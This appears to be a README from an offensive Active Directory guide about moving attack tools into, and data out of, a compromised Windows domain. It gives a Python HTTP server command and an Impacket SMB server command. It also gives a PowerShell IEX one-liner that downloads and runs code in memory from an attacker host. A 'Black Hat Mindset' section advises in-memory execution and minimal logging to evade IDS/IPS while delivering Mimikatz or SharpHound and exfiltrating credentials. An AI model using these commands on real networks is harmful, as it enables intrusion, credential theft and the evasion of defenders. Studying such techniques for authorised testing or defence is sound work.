# Active Directory Transferring Files README

This README covers techniques to move files into or out of a compromised AD environment, enabling payload delivery or data exfiltration.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [File Transfer Methods](#file-transfer-methods)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Transferring files in an AD environment is critical for delivering tools (e.g., `Mimikatz`, `SharpHound`) or exfiltrating sensitive data (e.g., hashes, credentials). This guide uses a Python HTTP server, PowerShell, and an Impacket SMB server to facilitate secure and efficient file transfers. Commands are performed from Linux or Windows hosts, assuming you have network access to the target.

## Setup and Prerequisites

- **Environment**: Linux host for Python and Impacket, Windows host for PowerShell.
- **Python**: Install on Linux (e.g., pre-installed on Kali) for the HTTP server.
- **Impacket**: Install on Linux (e.g., `pip install impacket`) for the SMB server.
- **PowerShell**: Run with privileges on Windows (right-click > "Run as Administrator").
- **Network Access**: Ensure the attacking host and target are on the same network or accessible via IP (e.g., 172.16.5.x).
- **Files**: Prepare files to transfer (e.g., `SharpHound.exe`) and place them in the hosting directory (e.g., `/home/administrator/Downloads/`).

## File Transfer Methods

Use these methods to transfer files into or out of the AD environment.

```bash
# Start Python HTTP server on port 8001 from Linux host
sudo python3 -m http.server 8001
```

```powershell
# PowerShell one-liner to download SharpHound.exe from HTTP server
IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')
```

```bash
# Start Impacket SMB server with credentials
impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/
```

## Black Hat Mindset

- **Keep It Simple**: Use lightweight servers like Python HTTP to avoid complex setup and detection.
- **Stay Undetected**: Transfer files in memory (e.g., `IEX`) or use SMB with minimal logging to evade IDS/IPS.
- **Secure Access**: Set up SMB with credentials to limit access and protect your foothold.
- **Maximize Efficiency**: Host multiple tools on the server to support various attack phases (e.g., enumeration, privilege escalation).

## Resources

- Python HTTP Server
- Impacket SMB Server
- PowerShell File Download
- AD File Transfer Techniques

